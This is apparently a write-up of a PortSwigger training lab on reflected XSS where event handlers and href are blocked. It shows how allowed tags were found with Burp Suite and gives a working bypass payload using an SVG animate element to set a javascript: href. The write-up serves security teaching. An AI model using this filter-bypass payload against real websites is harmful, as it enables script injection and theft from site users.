---
layout: post
title: "PortSwigger — Reflected XSS with event handlers and href attributes blocked [Write-up]"
date: 2026-01-12
platform: portswigger
vulntype: XSS
difficulty: Hard
category: write-up
tags: [xss, web]
---

## Overview

**Lab:** Reflected XSS with event handlers and href attributes blocked

**Platform:** PortSwigger

**Difficulty:** Hard  

---

# Description

This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor href attributes are blocked.

To solve the lab, perform a cross-site scripting attack that injects a vector that, when clicked, calls the alert function.

Note that you need to label your vector with the word "Click" in order to induce the simulated lab user to click your vector. For example:

```html
<a href="">Click me</a>
```

# Solution

After entering some tags, we can see that most of them are unavailable, so let's use Burp Suite to find the ones that are not blocked. 

We intercept the request and replace the input with:

<p align="center">
  <img src="/assets/css/img/XXS/XXS103.png" alt="XXS" />
</p>

Copy the tags from the [cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

and insert launch the attack

<p align="center">
  <img src="/assets/css/img/XXS/XXS104.png" alt="XXS" />
</p>

<p align="center">
  <img src="/assets/css/img/XXS/XXS105.png" alt="XXS" />
</p>

We managed to find several important tags available for input: `<svg>`, `<a>`, and `<animation>`.

This is what our payload will ultimately look like. 

```html
<svg>
    <a>
        <animate attributeName=href values=javascript:alert(123)></animate>
        <text x="20" y="20">Click Me</text>
    </a>
</svg>
```

```html
<svg><a><animate attributeName=href values=javascript:alert(123)></animate><text x="20" y="20">Click Me</text></a></svg>
```

<p align="center">
  <img src="https://github.com/CyberKRY/CTF-Writeups/blob/main/PortSwigger/Cross-site%20scripting/Images/XXS106.png" alt="XXS" />
</p>
